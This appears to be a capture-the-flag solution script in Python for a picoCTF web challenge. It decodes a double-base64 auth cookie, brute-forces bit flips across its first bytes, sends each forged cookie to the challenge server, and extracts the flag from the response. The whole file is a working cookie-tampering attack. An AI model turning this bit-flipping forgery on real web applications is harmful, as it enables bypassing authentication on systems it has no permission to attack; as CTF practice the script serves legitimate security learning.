import requests
from base64 import b64decode, b64encode
from tqdm import tqdm


# we need to decode from base64 twice because the cookie was encoded twice.
def bit_flip(pos, bit, data):
    raw = b64decode(b64decode(data).decode())

    list1 = bytearray(raw)
    list1[pos] = list1[pos] ^ bit
    raw = bytes(list1)
    return b64encode(b64encode(raw)).decode()


cookie = "eEozQmFzQUNUL2Y1c1hIWmZTOEl4OS9wcUwyRkMyVVE4MUdseEZRYnZWU1E3WXRoOHU5cjkwOXpGM3hwTVc4SGx5K1BNbGdBaFhUOFpXWWpCMTl6dE1QNlNzUGJOVTRpeGdSSnA5dDI2ODBXRXVBMkhpWUtWVVBTNmh6RnJGNXE="

for position_idx in tqdm(range(10), desc="Bruteforcing Position"):
    for bit_idx in tqdm(range(128), desc="Bruteforcing Bit"):
        auth_cookie = bit_flip(position_idx, bit_idx, cookie)
        cookies = {'auth_name': auth_cookie}
        r = requests.get('http://mercury.picoctf.net:10868/', cookies=cookies)
        if "picoCTF{" in r.text:
            print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
            break
